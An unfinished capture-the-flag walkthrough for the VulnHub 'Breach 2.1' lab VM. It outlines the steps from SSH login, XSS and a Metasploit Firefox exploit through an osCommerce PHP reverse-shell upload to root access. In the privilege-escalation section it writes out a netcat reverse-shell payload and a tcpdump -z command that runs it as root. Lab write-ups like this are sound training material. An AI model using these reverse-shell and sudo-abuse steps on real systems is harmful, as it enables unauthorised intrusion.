\####################

\# WORK IN PROGRESS #

\####################

# Breach 2.1

## Info
URL: (https://www.vulnhub.com/entry/breach-21,159/)[https://www.vulnhub.com/entry/breach-21,159/]

Type: Vulerable VM 

Goal: Boot2Root

## Walkthrough
 - Connect to SSH.
  - SSH running on non standard port.
  - Login to SSH using peter:inthesource, creds hinted at in SSH banner.
  - Website is now exposed on port 80.
  
 - Persistent XSS on members page.
  - XSS Bot is checking the members page.
  - Use Apache2 server and XSS redirect to determine bot browser version. (Firefox 15.0)
  - Use "FIREFOX 5.0 - 15.0.1 __EXPOSEDPROPS__ XCS CODE EXECUTION" metasploit exploit to get a shell as the user 'peter'.
  
 - Internal service running on port 2323.
  - Gives coords to Houston, Texas.
  - Login with milton:Houston
  - Riddle: Who's stapler is it?, answer with 'mine'
  - Returns shell with user 'milton'
  - Website is now exposed on port 8888.
  
- Oscommerce website running as root on port 8888.
  - Login to MySQL with creds found in website files at /var/www/html/blog/config.php
  - Crack administrator password (admin:admin)
  - Login to admin panel at /oscommerce/admin/index.php using creds from db.
  - Use shell to find writable subdirectories to upload php reverse shell. (find /var/www/html2/oscommerce/ -type f -writable)
  - Use fileupload to upload php reverse shell and execute.
  - Returns shell with user 'blumbergh'
  
- Priv esc to root
  - sudo -l tells use that we can run tcpdump as root with nopasswd.
  - Create payload, echo "nc [ID] [PORT] -e /bin.sh" > /tmp/payload
  - chmod +x /tmp/payload
  - Run tcpdump with -z flag to execute file on capture. tcpdump -l -i eth0 -w /dev/null -W1 -G1 -z /tmp/payload
  
- Root shell
  - run python /root/.flag.py
  - Done!
  
## Writeup 

